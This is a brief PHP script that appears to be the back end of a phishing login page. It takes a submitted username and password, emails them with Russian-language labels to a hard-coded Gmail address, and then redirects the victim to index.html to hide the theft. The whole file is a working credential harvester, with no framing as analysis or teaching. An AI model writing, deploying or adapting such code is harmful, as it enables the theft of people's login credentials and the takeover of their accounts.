<?php
$name = $_POST['user_name'];
$pass = $_POST['user_pass'];


$name = trim($name);
$pass = trim($pass);

if (mail("hyipernet1@gmail.com", "Заявка с сайта", "логин:".$name ." pass: ".$pass  ,"From: hyipernet1@gmail.com \r\n")) {
 header('location: index.html');
}else{
 echo 'Error';
}


?>
